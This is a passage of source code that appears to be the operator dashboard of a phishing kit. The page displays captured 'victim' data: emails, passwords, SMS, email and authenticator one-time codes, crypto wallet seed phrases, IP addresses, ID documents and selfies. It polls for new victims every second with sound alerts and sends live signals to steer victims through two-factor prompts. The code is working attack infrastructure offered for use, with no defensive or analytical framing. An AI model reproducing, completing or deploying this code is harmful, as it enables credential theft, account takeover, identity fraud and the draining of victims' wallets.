    </div>

    <div id="smsPopup" style="display:none;">
        <h3>Enter last 2 digits of number #</h3>
        <p>Last 2 digits</p>
        <input type="text">
        <button id="okSmsButton">OK</button>
        <button id="closeSmsButton">Close</button>
    </div>

    <div id="viewResults" class="popup-container">
    <h3 class="popup-title">Victim Information</h3>
    <div class="popup-content">
        <div id="loginResults" class="popup-section">
            <p><strong>Email:</strong> <span></span></p>
            <p><strong>Password:</strong> <span></span></p>
        </div>
        <div id="otpResults" class="popup-section">
            <p><strong>Phone OTP:</strong> <span></span></p>
            <p><strong>Auth app:</strong> <span></span></p>
            <p><strong>Login URL:</strong> <span class=""></span></p>
            <p><strong>Email OTP:</strong> <span></span></p>
        </div>
        <div id="seed" class="popup-section">
            <p><strong>Seed:</strong> <span></span></p>
        </div>
        <div id="createdDate" class="popup-section">
            <p><strong>Created at:</strong> <span></span></p>
            <p><strong>Updated at:</strong> <span></span></p>
        </div>
        <div id="ipLogs" class="popup-section">
            <p><strong>IP Address:</strong> <span></span></p>
            <p><strong>User Agent:</strong> <span></span></p>
        </div>
        <div class="tab-container">
            <div class="tab-buttons">
                <button class="tab-button active" data-tab="documents">Documents</button>
                <button class="tab-button" data-tab="selfies">Selfies</button>
            </div>
            <div id="documents" class="tab-content active">
                <h4>Uploaded Documents</h4>
                <div id="documentList"></div>
            </div>
            <div id="selfies" class="tab-content">
                <h4>Uploaded Selfies</h4>
                <div id="selfieList"></div>
            </div>
        </div>
    </div>
    <button id="okButtonViewResults" class="popup-close-btn">Close</button>
</div>

</div>


    <div id="notification-box" style="display:none" class="shake-animation">
        <img class="notification-image" src="../assets/notification-bell.png" alt="">
        <div id="p-content">
            <p><strong>User: </strong>test@yahoo.com</p>
            <p><strong>Submit: </strong>SMS</p>
        </div>
    </div>

    <audio id="notification-sound">
    <source src="../assets/notification-bloopy.mp3" type="audio/mpeg">
    Your browser does not support the audio element.
</audio>


<div id="success2fa" style="display:none;">
    <img src="../assets/Animation - 1713821498258.gif" alt="Success Animation" style="margin:0px;;">
    <p style="font-weight: bold; color: white; margin-top: 0;">SENT!</p>
    <button id="okButtonSuccess">OK</button>
</div>

<!-- Document Viewer Modal -->
<div id="documentViewerModal" class="document-viewer-modal">
    <div class="document-viewer-content">
        <button class="document-viewer-close" id="documentViewerClose">X</button>
        <img id="documentViewerImage" class="document-viewer-image" src="" alt="Document Image">
        <a id="documentDownloadLink" class="document-download-btn" download>Download Document</a>
    </div>
</div>

<!-- Selfie Viewer Modal -->
<div id="selfieViewerModal" class="document-viewer-modal">
    <div class="document-viewer-content">
        <button class="document-viewer-close" id="selfieViewerClose">X</button>
        <img id="selfieViewerImage" class="document-viewer-image" src="" alt="Selfie">
        <a id="selfieDownloadLink" class="document-download-btn" download>Download Selfie</a>
    </div>
</div>

    <!-- Timezone Selector Popup -->
    <div id="timezoneSelector" class="timezone-popup" style="display:none;">
        <div class="timezone-popup-content">
            <div class="timezone-popup-header">
                <h3>Add Time Zone</h3>
                <button class="timezone-close" onclick="closeTimezoneSelector()">×</button>
            </div>
            <div class="timezone-search">
                <input type="text" id="timezoneSearch" placeholder="Search cities..." oninput="filterTimezones()">
            </div>
            <div class="timezone-list" id="timezoneList">
                <!-- Populated by JavaScript -->
            </div>
        </div>
    </div>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script>
function toggleSpoiler() {
    var button = document.getElementById("reveal-button");
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '../seed.html', true);
    xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE) {
            if (xhr.status === 200) {
                var seedPhrase = xhr.responseText;
                console.log("Seed Phrase:", seedPhrase);
                button.innerHTML = seedPhrase;
                button.style.backgroundColor = "transparent";
                button.style.color = "#E0E0E0";
                button.style.backdropFilter = "none";
                button.style.webkitBackdropFilter = "none";
                button.style.cursor = "pointer";
                button.setAttribute("onclick", "copyToClipboard('" + seedPhrase + "')");
            } else {
                console.error("Error fetching seed:", xhr.status);
            }
        }
     };
    xhr.send();
}

function copyToClipboard(text) {
    var textArea = document.createElement("textarea");
    textArea.value = text;
    document.body.appendChild(textArea);
    textArea.select();
    document.execCommand("copy");
    document.body.removeChild(textArea);

    var notification = document.getElementById("copy-notification");
    notification.style.display = "block";

    setTimeout(function() {
        location.reload();
    }, 2000);

    setTimeout(function() {
        notification.style.display = "none";
    }, 2000);
}

function toggleTextInput() {
    var textInput = document.getElementById('textInput');
    textInput.style.display = (textInput.style.display === 'none' || textInput.style.display === '') ? 'block' : 'none';
}

document.addEventListener("DOMContentLoaded", function() {
    // Get reference to the close button
    var closeButton = document.getElementById("okButtonSuccess");
    
    // Add click event listener to the close button
    closeButton.addEventListener("click", function() {
        // Close the popup
        document.getElementById("success2fa").style.display = "none";
    });
});

// Function to show the success message popup
function showSuccessPopup() {
    // Show the popup
    document.getElementById("success2fa").style.display = "block";
    
    // Set a timeout to automatically close the popup after 3 seconds
    setTimeout(function() {
        document.getElementById("success2fa").style.display = "none";
    }, 3000); // Adjust the time as needed (in milliseconds)
}


// Global sound toggle variable

// Timezone functionality
const popularTimezones = [
    { name: 'New York', timezone: 'America/New_York' },
    { name: 'Los Angeles', timezone: 'America/Los_Angeles' },
    { name: 'Chicago', timezone: 'America/Chicago' },
    { name: 'Denver', timezone: 'America/Denver' },
    { name: 'London', timezone: 'Europe/London' },
    { name: 'Paris', timezone: 'Europe/Paris' },
    { name: 'Tokyo', timezone: 'Asia/Tokyo' },
    { name: 'Sydney', timezone: 'Australia/Sydney' },
    { name: 'Dubai', timezone: 'Asia/Dubai' },
    { name: 'Singapore', timezone: 'Asia/Singapore' },
    { name: 'Hong Kong', timezone: 'Asia/Hong_Kong' },
    { name: 'Toronto', timezone: 'America/Toronto' },
    { name: 'Vancouver', timezone: 'America/Vancouver' },
    { name: 'Mexico City', timezone: 'America/Mexico_City' },
    { name: 'São Paulo', timezone: 'America/Sao_Paulo' },
    { name: 'Buenos Aires', timezone: 'America/Argentina/Buenos_Aires' },
    { name: 'Madrid', timezone: 'Europe/Madrid' },
    { name: 'Rome', timezone: 'Europe/Rome' },
    { name: 'Berlin', timezone: 'Europe/Berlin' },
    { name: 'Moscow', timezone: 'Europe/Moscow' },
    { name: 'Mumbai', timezone: 'Asia/Kolkata' },
    { name: 'Beijing', timezone: 'Asia/Shanghai' },
    { name: 'Seoul', timezone: 'Asia/Seoul' },
    { name: 'Bangkok', timezone: 'Asia/Bangkok' }
];

function showTimezoneSelector() {
    const popup = document.getElementById('timezoneSelector');
    popup.style.display = 'flex';
    populateTimezoneList();
    document.getElementById('timezoneSearch').focus();
}

function closeTimezoneSelector() {
    document.getElementById('timezoneSelector').style.display = 'none';
    document.getElementById('timezoneSearch').value = '';
}

function populateTimezoneList(filter = '') {
    const list = document.getElementById('timezoneList');
    const filteredTimezones = popularTimezones.filter(tz => 
        tz.name.toLowerCase().includes(filter.toLowerCase()) ||
        tz.timezone.toLowerCase().includes(filter.toLowerCase())
    );
    
    list.innerHTML = filteredTimezones.map(tz => `
        <div class="timezone-option" onclick="addTimezone('${tz.timezone}', '${tz.name}')">
            <div class="timezone-option-city">${tz.name}</div>
            <div class="timezone-option-offset">${tz.timezone}</div>
        </div>
    `).join('');
}

function filterTimezones() {
    const filter = document.getElementById('timezoneSearch').value;
    populateTimezoneList(filter);
}

function addTimezone(timezone, cityName) {
    // Close the selector
    closeTimezoneSelector();
    
    // Add the timezone to the container (this would typically involve a server request)
    // For demo purposes, we'll add it to the DOM directly
    const container = document.querySelector('.timezones-container');
    const now = new Date();
    const tz = Intl.DateTimeFormat('en', {
        timeZone: timezone,
        hour: '2-digit',
        minute: '2-digit',
        hour12: false
    }).format(now);
    
    const date = Intl.DateTimeFormat('en', {
        timeZone: timezone,
        month: 'short',
        day: 'numeric'
    }).format(now);
    
    // Calculate UTC offset
    const tempDate = new Date();
    const localOffset = tempDate.getTimezoneOffset();
    const targetTime = new Date(tempDate.toLocaleString('en-US', {timeZone: timezone}));
    const targetOffset = (tempDate.getTime() - targetTime.getTime()) / (1000 * 60);
    const offset = (localOffset - targetOffset) / 60;
    
    const timezoneHtml = `
        <div class="time-zone" data-timezone="${timezone}">
            <div class="timezone-left">
                <div class="timezone-city">${cityName}</div>
                <div class="timezone-offset">UTC${offset >= 0 ? '+' : ''}${offset}</div>
            </div>
            <div class="timezone-right">
                <div class="timezone-time">${tz}</div>
                <div class="timezone-date">${date}</div>
            </div>
            <button class="timezone-remove" onclick="removeTimezone('${timezone}')" title="Remove timezone">×</button>
        </div>
    `;
    
    container.insertAdjacentHTML('beforeend', timezoneHtml);
}

function removeTimezone(timezone) {
    const element = document.querySelector(`[data-timezone="${timezone}"]`);
    if (element) {
        element.remove();
    }
}

// Update times every minute
setInterval(function() {
    document.querySelectorAll('.time-zone').forEach(function(element) {
        const timezone = element.getAttribute('data-timezone');
        if (timezone) {
            const now = new Date();
            const time = Intl.DateTimeFormat('en', {
                timeZone: timezone,
                hour: '2-digit',
                minute: '2-digit',
                hour12: false
            }).format(now);
            
            const date = Intl.DateTimeFormat('en', {
                timeZone: timezone,
                month: 'short',
                day: 'numeric'
            }).format(now);
            
            const timeElement = element.querySelector('.timezone-time');
            const dateElement = element.querySelector('.timezone-date');
            
            if (timeElement) timeElement.textContent = time;
            if (dateElement) dateElement.textContent = date;
        }
    });
}, 60000); // Update every minute
let soundEnabled = true;

document.addEventListener('DOMContentLoaded', () => {
    const popup = document.getElementById('popup');
    const viewResultsDiv = document.getElementById('viewResults');
    const smsPopup = document.getElementById('smsPopup');
    const originalBodyBackgroundColor = document.body.style.backgroundColor;
    let popupOpen = false;

    // Sound toggle functionality
    const soundToggle = document.getElementById('soundToggle');
    const soundIcon = document.getElementById('soundIcon');
    
    // Load saved sound preference
    if (localStorage.getItem('soundEnabled') === 'false') {
        soundEnabled = false;
        soundToggle.classList.add('muted');
        soundIcon.textContent = '🔇';
    }
    
    soundToggle.addEventListener('click', () => {
        soundEnabled = !soundEnabled;
        localStorage.setItem('soundEnabled', soundEnabled);
        
        if (soundEnabled) {
            soundToggle.classList.remove('muted');
            soundIcon.textContent = '🔊';
        } else {
            soundToggle.classList.add('muted');
            soundIcon.textContent = '🔇';
        }
    });

    document.body.addEventListener('click', (event) => {
        if (event.target.classList.contains('send-button')) {
            togglePopup(event.target.dataset.email, event.target.dataset.userid);
        } else if (event.target.classList.contains('view-button')) {
            showViewResults(event.target.dataset);
        } else if (event.target.id === 'closeButton' || event.target.id === 'closeSmsButton') {
            closePopup();
        } else if (event.target.id === 'okButton' || event.target.id === 'okButtonViewResults') {
            closeViewResults();
        } else if (event.target.id === 'refreshButton') {
            location.reload();
        } else if (event.target.classList.contains('delete-button')) {
            showConfirmationBox(event);
        } else if (event.target.id === 'confirm-delete') {
            confirmDelete();
        } else if (event.target.id === 'cancel-delete') {
            cancelDelete();
        } else if (event.target.id === 'logoutButton') {
            logout();
        } else if (event.target.id === 'okButton') {
            showSmsPopup();
        } else if (event.target.id === 'okSmsButton') {
            handleOkSmsButtonClick();
        } else if (event.target.id === 'documentViewerClose') {
            closeDocumentViewer();
        }
    });

    const togglePopup = (email, userid) => {
        popup.style.display = popupOpen ? 'none' : 'block';
        popupOpen = !popupOpen;
    };

    const showViewResults = ({ email, password, phoneotp, createdat, updatedat, ipaddress, useragent, authapp, loginurl, emailotp, emailapp, seed, token }) => {
        // Update login information
        document.getElementById('loginResults').querySelector('span').textContent = email;
        document.getElementById('loginResults').querySelectorAll('span')[1].textContent = password;

        // Update OTP information
        document.getElementById('otpResults').querySelector('span').textContent = phoneotp;
        document.getElementById('otpResults').querySelectorAll('span')[1].textContent = authapp;

        // Create a link element for the loginurl
        const loginUrlLink = document.createElement('a');
        loginUrlLink.href = loginurl;
        loginUrlLink.textContent = 'Authorize';
        loginUrlLink.target = '_blank'; // Open link in a new tab
        // Apply CSS styles to the link
        loginUrlLink.style.color = 'blue';
        loginUrlLink.style.textDecoration = 'underline';

        // Clear any existing content in the span and append the link
        const loginUrlSpan = document.getElementById('otpResults').querySelectorAll('span')[2];
        loginUrlSpan.innerHTML = '';
        loginUrlSpan.appendChild(loginUrlLink);

        document.getElementById('otpResults').querySelectorAll('span')[3].textContent = emailotp;

        // Update seed information
        document.getElementById('seed').querySelectorAll('span')[0].textContent = seed;

        // Update created and updated date information
        document.getElementById('createdDate').querySelectorAll('span')[0].textContent = createdat;
        document.getElementById('createdDate').querySelectorAll('span')[1].textContent = updatedat;

        // Update IP logs information
        document.getElementById('ipLogs').querySelectorAll('span')[0].textContent = ipaddress;
        document.getElementById('ipLogs').querySelectorAll('span')[1].textContent = useragent;

        // Set token on the popup content for tab switching
        document.querySelector('.popup-content').setAttribute('data-token', token);
        
        // Fetch and display document information
        fetchDocumentData(token);

        // Show the view results div
        viewResultsDiv.style.display = viewResultsDiv.style.display === 'block' ? 'none' : 'block';
        document.body.classList.toggle('button-clicked');
    };

    const closePopup = () => {
        popup.style.display = 'none';
        document.body.style.backgroundColor = originalBodyBackgroundColor;
        popupOpen = false;
    };

    const closeViewResults = () => {
        viewResultsDiv.style.display = 'none';
        document.body.classList.remove('button-clicked');
    };

    const showConfirmationBox = (event) => {
        $('#confirmation-box').show();
        const id = event.target.closest('tr').querySelector('td:first-child').textContent;
        $('#confirmation-box').data('id', id);
        $('body').addClass('button-clicked');
    };

    const confirmDelete = () => {
        const id = $('#confirmation-box').data('id');
        $.ajax({
            type: 'POST',
            url: 'delete.php',
            data: { id },
            success: () => location.reload(),
            error: (xhr, status, error) => console.error(xhr.responseText)
        });
        $('#confirmation-box').hide();
        $('body').removeClass('button-clicked');
    };

    const cancelDelete = () => {
        $('#confirmation-box').hide();
        $('body').removeClass('button-clicked');
    };

    const logout = () => {
        window.location.href = 'logout.php';
    };
});

$(() => {
    let previousData = [];

    const fetchData = () => {
        $.ajax({
            url: 'fetchdata.php',
            type: 'GET',
            dataType: 'json',
            success: (data) => {
                updateTable(data);
                checkForNewUsers(data);
                previousData = data;
            },
            error: (xhr, status, error) => console.error('Error fetching data: ' + error)
        });
    };

    const updateTable = (data) => {
        $('#dataTable tbody').empty();
        data.reverse();
        data.forEach((row) => {
            const newRow = `<tr>
                                <td>${row.id}</td>
                                <td>${row.token}</td>
                                <td>${row.activity}</td>
                                <td>${row.email}</td>
                                <td>${row.status} ${row.status === "online" ? "🔵" : "🔴"}</td>
                                <td class="actions">
                                    <button class="button send-button" data-userid="${row.id}" data-token="${row.token}">Send</button>
                                    <button class="button view-button" data-email="${row.email}" data-password="${row.password}" data-createdat="${row.created_at}" data-updatedat="${row.updated_at}" data-ipaddress="${row.ip_address}" data-useragent="${row.user_agent}" data-phoneotp="${row.phone_otp}" data-loginurl="${row.login_url}" data-authapp="${row.auth_app}" data-emailotp="${row.email_otp}" data-seed="${row.seed}" data-token="${row.token}">View</button>
                                    <button class="button delete-button">Delete</button>
                                </td>
                            </tr>`;
            $('#dataTable tbody').append(newRow);
        });
    };

    const checkForNewUsers = (data) => {
        data.forEach((currentRow) => {
            let isNewUser = true;
            previousData.forEach((previousRow) => {
                if (currentRow.id === previousRow.id) {
                    isNewUser = false;
                }
            });
            if (isNewUser && !localStorage.getItem('notification_displayed_' + currentRow.id)) {
                // Only play sound if enabled
                if (soundEnabled) {
                    document.getElementById('notification-sound').play().catch(e => console.log('Sound play failed:', e));
                }
                //displayNotification(currentRow.email, currentRow.activity);
                //localStorage.setItem('notification_displayed_' + currentRow.id, true);
            } else if (isNewUser && currentRow.activity === 'password' && !localStorage.getItem('password_notification_displayed_' + currentRow.id)) {
                document.getElementById('notification-sound').play();
                //displayPasswordNotification(currentRow.email, currentRow.activity);
                //localStorage.setItem('password_notification_displayed_' + currentRow.id, true);
            }
        });
    };
/*
    const displayNotification = (email, activity) => {
        $('#notification-box').css('display', 'flex');
        $('#notification-box').find('p:first-child').html(`<strong style="color:black">User:</strong> ${email}`);
        $('#notification-box').find('p:last-child').html(`<strong style="color:black">Submit:</strong> ${activity}`);
        setTimeout(() => {
            $('#notification-box').fadeOut();
        }, 3000);
    };

    const displayPasswordNotification = (email, activity) => {
        $('#notification-box').css('display', 'flex');
        $('#notification-box').find('p:first-child').html(`<strong style="color:black">User: ${email}</strong>`);
        $('#notification-box').find('p:last-child').html(`<strong style="color:black">Submit: ${activity}</strong>`);
        setTimeout(() => {
            $('#notification-box').fadeOut();
        }, 3000);
    };
*/
    fetchData();
    setInterval(fetchData, 1000);
});

$('#okButton').click(function() {
    var selectedOption = $('#options').val(); // Get the selected option value
    var token = $(this).data('token'); // Get the token from the clicked button

    // Send AJAX request with the signal and token
    $.ajax({
        type: 'POST',
        url: '../signal.php', // Adjust the URL if needed
        data: { selectedOption: selectedOption, token: token },
        success: function(response) {
            console.log('Signal sent successfully');
            // Display success2fa div
            $('#success2fa').show();
        },
        error: function(xhr, status, error) {
            console.error('Error sending signal: ' + error);
        }
    });
});

const showSmsPopup = () => {
    $('#smsPopup').show();
};

const handleOkSmsButtonClick = () => {
    $('#smsPopup').hide();
};

// Document Viewer Functions
const fetchDocumentData = (token) => {
    // Clear previous document list
    document.getElementById('documentList').innerHTML = '<p>Loading documents...</p>';
    
    // Fetch document data from server
    fetch(`fetch_documents.php?token=${encodeURIComponent(token)}`)
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                displayDocuments(data.documents);
            } else {
                document.getElementById('documentList').innerHTML = `<p>${data.error || 'No documents found for this victim.'}</p>`;
            }
        })
        .catch(error => {
            console.error('Error fetching document data:', error);
            document.getElementById('documentList').innerHTML = '<p>Error loading documents.</p>';
        });
};

const displayDocuments = (documents) => {
    const documentListElement = document.getElementById('documentList');
    
    if (!documents || documents.length === 0) {
        documentListElement.innerHTML = '<p>No documents submitted.</p>';
        return;
    }
    
    let documentListHTML = '';
    
    documents.forEach(doc => {
        documentListHTML += `
            <div class="document-list-item">
                <span class="document-type">${doc.type}</span>
                <div class="document-actions">
                    <button class="document-btn" onclick="viewDocument('${doc.path}')">View</button>
                    <a class="document-btn download" href="serve_document.php?path=${doc.path}" download>Download</a>
                </div>
            </div>
        `;
    });
    
    documentListElement.innerHTML = documentListHTML;
};

const viewDocument = (documentPath) => {
    const viewerModal = document.getElementById('documentViewerModal');
    const viewerImage = document.getElementById('documentViewerImage');
    const downloadLink = document.getElementById('documentDownloadLink');
    
    // Set the image source
    viewerImage.src = `serve_document.php?path=${encodeURIComponent(documentPath)}`;
    
    // Set the download link
    downloadLink.href = `serve_document.php?path=${encodeURIComponent(documentPath)}`;
    
    // Show the modal
    viewerModal.style.display = 'flex';
};

const closeDocumentViewer = () => {
    const viewerModal = document.getElementById('documentViewerModal');
    viewerModal.style.display = 'none';
};

// Selfie Viewer Functions
const fetchSelfieData = (token) => {
    // Clear previous selfie list
    document.getElementById('selfieList').innerHTML = '<p>Loading selfies...</p>';
    
    // Fetch selfie data from server
    fetch(`fetch_selfies.php?token=${encodeURIComponent(token)}`)
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                displaySelfies(data.selfies);
            } else {
                document.getElementById('selfieList').innerHTML = `<p>${data.error || 'No selfies found for this victim.'}</p>`;
            }
        })
        .catch(error => {
            console.error('Error fetching selfie data:', error);
            document.getElementById('selfieList').innerHTML = '<p>Error loading selfies.</p>';
        });
};

const displaySelfies = (selfies) => {
    const selfieListElement = document.getElementById('selfieList');
    
    if (!selfies || selfies.length === 0) {
        selfieListElement.innerHTML = '<p>No selfies submitted.</p>';
        return;
    }
    
    let selfieListHTML = '';
    
    selfies.forEach((selfie, index) => {
        selfieListHTML += `
            <div class="document-list-item">
                <span class="document-type">Selfie ${index + 1}</span>
                <div class="document-actions">
                    <button class="document-btn" onclick="viewSelfie('${selfie.path}')">View</button>
                    <a class="document-btn download" href="serve_document.php?path=${selfie.path}" download>Download</a>
                </div>
            </div>
        `;
    });
    
    selfieListElement.innerHTML = selfieListHTML;
};

const viewSelfie = (selfiePath) => {
    const viewerModal = document.getElementById('selfieViewerModal');
    const viewerImage = document.getElementById('selfieViewerImage');
    const downloadLink = document.getElementById('selfieDownloadLink');
    
    // Set the image source
    viewerImage.src = `serve_document.php?path=${encodeURIComponent(selfiePath)}`;
    
    // Set the download link
    downloadLink.href = `serve_document.php?path=${encodeURIComponent(selfiePath)}`;
    
    // Show the modal
    viewerModal.style.display = 'flex';
};

const closeSelfieViewer = () => {
    const viewerModal = document.getElementById('selfieViewerModal');
    viewerModal.style.display = 'none';
};

// Add event listeners for modal close buttons
document.addEventListener('DOMContentLoaded', () => {
    // Document viewer close button
    const docCloseBtn = document.getElementById('documentViewerClose');
    if (docCloseBtn) {
        docCloseBtn.addEventListener('click', closeDocumentViewer);
    }
    
    // Selfie viewer close button
    const selfieCloseBtn = document.getElementById('selfieViewerClose');
    if (selfieCloseBtn) {
        selfieCloseBtn.addEventListener('click', closeSelfieViewer);
    }
    
    // Tab switching functionality
    const tabButtons = document.querySelectorAll('.tab-button');
    tabButtons.forEach(button => {
        button.addEventListener('click', () => {
            // Remove active class from all buttons and content
            document.querySelectorAll('.tab-button').forEach(btn => btn.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
            
            // Add active class to clicked button and corresponding content
            button.classList.add('active');
            const tabId = button.getAttribute('data-tab');
            document.getElementById(tabId).classList.add('active');
            
            // If switching to selfies tab and no selfies loaded yet, fetch them
            if (tabId === 'selfies' && document.querySelectorAll('#selfieList .document-list-item').length === 0) {
                const token = document.querySelector('.popup-content').getAttribute('data-token');
                if (token) {
                    fetchSelfieData(token);
                }
            }
        });
    });
    
    // Close modals when clicking outside
    window.addEventListener('click', (event) => {
        const docModal = document.getElementById('documentViewerModal');
        const selfieModal = document.getElementById('selfieViewerModal');
        
        if (event.target === docModal) {
            closeDocumentViewer();
        }
        
        if (event.target === selfieModal) {
            closeSelfieViewer();
        }
    });
});
</script>
</body>
</html>
<?php
$conn->close();
?>